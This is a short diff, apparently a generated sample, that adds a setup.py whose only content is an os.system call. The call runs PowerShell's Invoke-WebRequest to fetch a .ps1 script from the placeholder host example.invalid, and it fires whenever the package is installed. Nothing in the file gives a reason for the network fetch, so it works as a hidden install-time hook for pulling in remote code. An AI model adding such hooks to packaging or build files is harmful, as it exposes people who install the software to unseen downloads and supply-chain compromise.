@@ -1,0 +1,8 @@
+# path: setup.py
+# lines: 4
+# weight: 35
+# ---
+import os
+TOOL = "powershell"
+target = "example.invalid/a.ps1"
+os.system(f"{TOOL} -c iwr {target}")
